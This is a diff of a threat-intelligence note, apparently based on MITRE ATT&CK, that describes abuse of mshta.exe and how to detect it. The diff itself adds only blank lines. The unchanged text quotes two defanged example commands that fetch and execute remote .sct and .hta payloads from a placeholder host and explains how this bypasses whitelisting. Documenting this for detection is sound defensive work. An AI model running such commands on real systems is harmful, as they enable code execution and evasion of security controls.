@@ -19,6 +19,8 @@ tactics:
 
 Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. [1] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [2]Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [3] [4] [5] [6] [7] Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]
 
+
+
 # Detection
 
 Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.
@@ -69,3 +71,5 @@ Mshta.exe may not be necessary within a given environment since its functionalit
 
 - [[Defense Evasion|TA0005 - Defense Evasion]]
 - [[Execution|TA0002 - Execution]]
+
+
